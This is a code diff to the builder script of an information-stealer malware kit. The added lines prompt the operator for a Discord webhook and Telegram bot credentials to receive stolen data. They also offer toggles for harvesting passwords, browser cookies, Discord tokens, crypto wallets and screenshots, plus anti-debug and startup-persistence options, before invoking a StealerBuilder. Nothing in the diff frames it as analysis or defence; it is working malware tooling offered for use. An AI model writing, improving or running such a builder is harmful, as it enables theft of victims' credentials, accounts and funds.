@@ -110,34 +110,62 @@ def run_builder():
         with open(config_path, 'r') as f:
             config = json.load(f)
         
-        # Example build configuration
+        # Interactive build configuration
+        print("Configure your stealer build:")
+        print()
+        
+        # Required webhook
+        webhook_url = input("Enter Discord webhook URL (required): ").strip()
+        if not webhook_url:
+            print("[ERROR] Discord webhook URL is required!")
+            return False
+        
+        # Optional configuration
+        filename = input("Enter output filename (default: stealer): ").strip() or "stealer"
+        telegram_token = input("Enter Telegram bot token (optional): ").strip()
+        telegram_chat = input("Enter Telegram chat ID (optional): ").strip()
+        
+        # Features selection
+        print("\nSelect features to include (y/n):")
+        passwords = input("Include passwords (Y/n): ").strip().lower() not in ['n', 'no']
+        cookies = input("Include cookies (Y/n): ").strip().lower() not in ['n', 'no']
+        discord = input("Include Discord tokens (Y/n): ").strip().lower() not in ['n', 'no']
+        wallets = input("Include wallets (Y/n): ").strip().lower() not in ['n', 'no']
+        screenshot = input("Include screenshot (Y/n): ").strip().lower() not in ['n', 'no']
+        
+        # Protection options
+        print("\nSelect protection options (y/n):")
+        anti_debug = input("Enable anti-debug (y/N): ").strip().lower() in ['y', 'yes']
+        startup = input("Enable startup persistence (y/N): ").strip().lower() in ['y', 'yes']
+        
         build_config = {
-            "filename": "stealer.exe",
-            "webhook_url": input("Enter Discord webhook URL: ").strip(),
+            "filename": filename,
+            "webhook_url": webhook_url,
             "telegram_config": {
-                "bot_token": input("Enter Telegram bot token (optional): ").strip(),
-                "chat_id": input("Enter Telegram chat ID (optional): ").strip()
+                "bot_token": telegram_token,
+                "chat_id": telegram_chat
             },
             "features": {
-                "passwords": True,
-                "cookies": True,
-                "discord_tokens": True,
-                "wallets": True,
-                "telegram": True,
-                "screenshot": True
+                "passwords": passwords,
+                "cookies": cookies,
+                "discord_tokens": discord,
+                "wallets": wallets,
+                "telegram": bool(telegram_token and telegram_chat),
+                "screenshot": screenshot
             },
             "protection": {
-                "anti_debug": False,
-                "startup": False,
+                "anti_debug": anti_debug,
+                "startup": startup,
                 "melt": False,
                 "upx_packing": False,
                 "crypto_clipper": False
             }
         }
         
-        if not build_config["webhook_url"]:
-            print("[ERROR] Discord webhook URL is required!")
-            return False
+        print(f"\n[INFO] Building stealer with filename: {filename}")
+        print(f"[INFO] Features enabled: {[k for k, v in build_config['features'].items() if v]}")
+        print(f"[INFO] Protection enabled: {[k for k, v in build_config['protection'].items() if v]}")
+        print()
         
         # Build stealer
         builder = StealerBuilder(config)
